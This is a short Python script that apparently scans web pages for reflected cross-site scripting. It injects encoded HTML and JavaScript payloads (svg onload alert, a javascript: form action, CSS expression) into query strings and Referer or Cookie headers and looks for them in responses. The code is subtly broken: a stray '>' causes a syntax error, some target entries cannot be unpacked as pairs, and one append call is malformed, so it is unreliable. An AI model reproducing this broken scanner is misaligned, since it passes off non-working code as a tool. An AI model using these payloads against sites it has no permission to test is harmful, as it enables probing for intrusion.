import requests
from urllib.parse import quote_plus, unquote_plus

def detect_xss(url, header=None):
    # Commonly exploited tags and attributes for XSS.
    targets = [
        ("<img src='x' >", "<svg/onload=alert('x')>"),
        ("<input value='x'>", "<form action=\"javascript:alert('x');\">"),
        ('<body background="x">',),
        ('<link href="data:text/css; x">'),
        ("<iframe src='x' height='1000' width='1000'>", "<object data='x'>"),
        ('<div style="height:expression(alert(123),1);width:expression(alert(123),1);">' >),
    ]

    # Encodings to check
    encodings = ['url', 'hex']

    possible_payloads = []

    for tag, attr in targets:
        for encoding in encodings:
            if encoding == 'url':
                tag_encoded = quote_plus(tag)
                attr_encoded = quote_plus(attr)
            else:
                tag_encoded = ''.join([f'{ord(c):02x}' for c in tag])
                attr_encoded = ''.join([f'{ord(c):02x}' for c in attr])

            test_url_1 = url.format(input_value=tag_encoded)
            test_url_2 = url.format(input_value=attr_encoded)

            headers = {}
            if header:
              headers = {
                  header['name']: tag_encoded,
                  'User-Agent': 'Mozilla/5.0',
              }

            resp_1 = requests.get(test_url_1, headers=headers)
            resp_2 = requests.get(test_url_2, headers=headers)

            if any(x in str(resp_1.content) for x in [unquote_plus(tag), unquote_plus(attr)]):
                possible_payloads.append((test_url_1, unquote_plus(tag), header))
            
            if any(y in str(resp_2.content) for y in [unquote_plus(attr), unquote_plus(tag)]):
                possible_payloads.append((test_url_2, unquote_plus(attr)), header)

    return possible_payloads

# Example usage
urls = ["http://www.example1.com/search?q={input_value}", "http://www.example2.com/login?username={input_value}"]

headers = [{"name": "Referer"}, {"name": "Cookie"}]

for index, url in enumerate(urls):
    header = headers[index] if len(headers) > index else None
    xss_results = detect_xss(url, header)
    print(f"\nTesting URL: {url}\n")
    print("Possible XSS vulnerabilities:")
    for result in xss_results:
        print(f"URL: {result[0]}, Payload: {result[1]}, Header: {header}")
